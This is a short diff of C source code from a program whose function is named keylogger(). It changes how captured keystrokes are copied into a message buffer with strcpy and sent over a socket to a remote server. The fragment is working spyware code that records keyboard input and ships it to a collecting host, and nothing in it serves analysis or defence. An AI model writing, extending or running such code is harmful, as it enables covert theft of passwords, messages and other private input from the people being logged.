@@ -97,10 +97,12 @@ const void keylogger()
                 altgr_flag = event.code;
 
             if (shift_flag && !altgr_flag && !SHIFT(event.code))
-                send_message(sock, serv, shifted_keycodes[event.code]);
+                strcpy(client_message, shifted_keycodes[event.code]);
 
             else if (!shift_flag && !altgr_flag && !SHIFT(event.code))
-                send_message(sock, serv, keycodes[event.code]);
+                strcpy(client_message, keycodes[event.code]);
+
+            send_message(sock, serv, client_message);
         }
         else
         {
